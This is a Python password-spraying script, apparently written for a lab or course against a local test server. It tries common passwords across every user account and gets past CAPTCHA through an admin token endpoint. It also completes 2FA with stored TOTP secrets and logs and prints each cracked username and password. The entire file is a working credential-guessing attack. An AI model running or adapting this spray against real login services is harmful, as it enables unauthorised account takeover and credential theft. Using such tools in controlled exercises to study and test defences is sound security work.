#!/usr/bin/env python3
"""Password Spraying Attack Script"""

import json
import time
import argparse
import requests
import pyotp
from pathlib import Path

GROUP_SEED = 897878
DEFAULT_MAX_ATTEMPTS = 50000
DEFAULT_TIME_LIMIT = 7200
DEFAULT_LOG_FILE = "spray_attack.log"

def log_attempt(log_file, username, password, result, latency_ms):
    entry = {"timestamp": time.time(), "username": username, "password_tried": password, "result": result, "latency_ms": latency_ms, "attack_type": "password_spray"}
    with open(log_file, "a") as f:
        f.write(json.dumps(entry) + "\n")

def load_passwords(path):
    passwords = []
    with open(path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                passwords.append(line)
    return passwords

def load_users(users_json_path):
    with open(users_json_path, 'r') as f:
        data = json.load(f)
    return data.get("users", [])

def load_totp_secrets(users_json_path):
    secrets = {}
    secrets_path = Path(users_json_path).parent / "totp_secrets.json"
    if secrets_path.exists():
        with open(secrets_path, 'r') as f:
            secrets = json.load(f)
    return secrets

def get_captcha_token(base_url):
    try:
        response = requests.get(f"{base_url}/admin/get_captcha_token", params={"group_seed": GROUP_SEED})
        if response.status_code == 200:
            return response.json().get("captcha_token")
    except Exception as e:
        print(f"[!] Failed to get CAPTCHA token: {e}")
    return None

def attempt_login(base_url, username, password, captcha_token=None):
    start_time = time.time()
    payload = {"username": username, "password": password}
    if captcha_token:
        payload["captcha_token"] = captcha_token
    try:
        response = requests.post(f"{base_url}/login", json=payload)
        latency_ms = (time.time() - start_time) * 1000
        data = response.json()
        message = data.get("message", data.get("detail", ""))
        return {"success": response.status_code == 200 and "successful" in message.lower(), "requires_captcha": response.status_code == 400 and "Captcha required" in message, "requires_totp": response.status_code == 200 and "2FA Required" in message, "message": message, "latency_ms": latency_ms}
    except requests.exceptions.ConnectionError:
        return {"success": False, "requires_captcha": False, "requires_totp": False, "message": "Connection error", "latency_ms": 0}

def attempt_totp(base_url, username, totp_secret):
    start_time = time.time()
    totp = pyotp.TOTP(totp_secret)
    try:
        response = requests.post(f"{base_url}/login_totp", json={"username": username, "totp_code": totp.now()})
        latency_ms = (time.time() - start_time) * 1000
        data = response.json()
        message = data.get("message", data.get("detail", ""))
        return {"success": response.status_code == 200 and "successful" in message.lower(), "latency_ms": latency_ms}
    except Exception:
        return {"success": False, "latency_ms": 0}

def run_spray(base_url, users_json_path, passwords_path, max_attempts, time_limit, with_totp=False, log_file=DEFAULT_LOG_FILE):
    print("[*] Password Spraying Attack")
    print(f"[*] Logging to: {log_file}")
    print(f"[*] Server: {base_url}")
    print("-" * 50)
    users = load_users(users_json_path)
    passwords = load_passwords(passwords_path)
    totp_secrets = load_totp_secrets(users_json_path) if with_totp else {}
    print(f"[*] Users: {len(users)}")
    print(f"[*] Passwords to try: {len(passwords)}")
    print("-" * 50)
    start_time = time.time()
    attempts = 0
    successes = 0
    cracked_users = []
    captcha_fetches = 0
    total_latency = 0
    captcha_tokens = {}
    print("[*] Starting spray...")
    for password in passwords:
        elapsed = time.time() - start_time
        if attempts >= max_attempts or elapsed >= time_limit:
            break
        print(f"\n[*] Trying password: '{password}'")
        for user in users:
            username = user["username"]
            if username in [u["username"] for u in cracked_users]:
                continue
            elapsed = time.time() - start_time
            if attempts >= max_attempts:
                print(f"\n[!] Max attempts ({max_attempts}) reached")
                break
            if elapsed >= time_limit:
                print(f"\n[!] Time limit ({time_limit}s) reached")
                break
            attempts += 1
            captcha_token = captcha_tokens.get(username)
            result = attempt_login(base_url, username, password, captcha_token)
            total_latency += result["latency_ms"]
            log_result = "Success" if result["success"] else "Failure"
            log_attempt(log_file, username, password, log_result, result["latency_ms"])
            if result["requires_captcha"]:
                captcha_token = get_captcha_token(base_url)
                captcha_fetches += 1
                if captcha_token:
                    captcha_tokens[username] = captcha_token
                    result = attempt_login(base_url, username, password, captcha_token)
                    total_latency += result["latency_ms"]
            if result["requires_totp"]:
                totp_secret = totp_secrets.get(username)
                if totp_secret:
                    totp_result = attempt_totp(base_url, username, totp_secret)
                    total_latency += totp_result["latency_ms"]
                    if totp_result["success"]:
                        result["success"] = True
                else:
                    successes += 1
                    cracked_users.append({"username": username, "password": password, "category": user.get("category", "unknown")})
                    print(f"  [+] PASSWORD FOUND: {username} -> '{password}' (TOTP required)")
                    continue
            if result["success"]:
                successes += 1
                cracked_users.append({"username": username, "password": password, "category": user.get("category", "unknown")})
                print(f"  [+] CRACKED: {username} -> '{password}'")
    elapsed = time.time() - start_time
    avg_latency = total_latency / attempts if attempts > 0 else 0
    attempts_per_sec = attempts / elapsed if elapsed > 0 else 0
    print("\n" + "=" * 50)
    print("[*] SPRAY SUMMARY")
    print("=" * 50)
    print(f"Total attempts:      {attempts}")
    print(f"Users cracked:       {successes}/{len(users)}")
    print(f"Time elapsed:        {elapsed:.2f}s")
    print(f"Attempts/second:     {attempts_per_sec:.2f}")
    print(f"Avg latency:         {avg_latency:.2f}ms")
    print(f"CAPTCHA fetches:     {captcha_fetches}")
    if cracked_users:
        print("\nCracked users:")
        for u in cracked_users:
            print(f"  - {u['username']} ({u['category']}): {u['password']}")
    print("=" * 50)
    return {"total_attempts": attempts, "users_cracked": successes, "total_users": len(users), "cracked_users": cracked_users, "time_elapsed_s": elapsed, "attempts_per_second": attempts_per_sec, "avg_latency_ms": avg_latency, "group_seed": GROUP_SEED}

def main():
    parser = argparse.ArgumentParser(description="Password Spraying Attack")
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    parser.add_argument("--users-json", default=str(Path(__file__).parent.parent.parent / "server" / "users.json"))
    parser.add_argument("--passwords", "-p", default=str(Path(__file__).parent / "common_passwords.txt"))
    parser.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS)
    parser.add_argument("--time-limit", type=int, default=DEFAULT_TIME_LIMIT)
    parser.add_argument("--with-totp", action="store_true")
    parser.add_argument("--log", default=DEFAULT_LOG_FILE)
    parser.add_argument("--output", "-o")
    args = parser.parse_args()
    results = run_spray(base_url=args.base_url, users_json_path=args.users_json, passwords_path=args.passwords, max_attempts=args.max_attempts, time_limit=args.time_limit, with_totp=args.with_totp, log_file=args.log)
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[*] Results saved to: {args.output}")

if __name__ == "__main__":
    main()
